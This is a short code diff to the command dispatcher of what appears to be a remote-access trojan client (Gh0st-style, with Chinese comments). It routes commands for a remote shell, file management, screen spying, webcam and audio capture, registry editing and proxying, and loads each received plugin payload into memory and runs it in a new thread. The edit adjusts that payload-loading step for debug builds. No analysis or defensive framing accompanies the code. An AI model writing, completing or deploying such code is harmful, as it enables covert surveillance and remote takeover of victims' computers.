@@ -141,17 +141,23 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
     case COMMAND_LIST_DRIVE: // 文件管理
     case COMMAND_SHELL: // 远程终端
     case COMMAND_SCREEN_SPY: // 屏幕查看
-    case COMMAND_SCREEN_SPY1: // 屏幕查看
     case COMMAND_AUDIO: //语音
     case COMMAND_WEBCAM: // 视频
     case COMMAND_SERVICE_MANAGER:
     case COMMAND_REGEDIT:
     case COMMAND_PROXY_MAP:
     case COMMAND_TEXT_CHAT: { //远程交谈
+#ifdef _DEBUG
+        PBYTE hMemDll = (PBYTE)VirtualAlloc(0, nSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (hMemDll == NULL)
+			break;
+        memcpy(hMemDll, lpBuffer, nSize);
+#else
         PBYTE hMemDll   = (PBYTE)VirtualAlloc(0,nSize - 1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
         if (hMemDll == NULL)
             break;
         memcpy(hMemDll,lpBuffer + 1,nSize -1);
+#endif
         m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Plugin,
                                       (LPVOID)hMemDll, 0, NULL,true);
     }
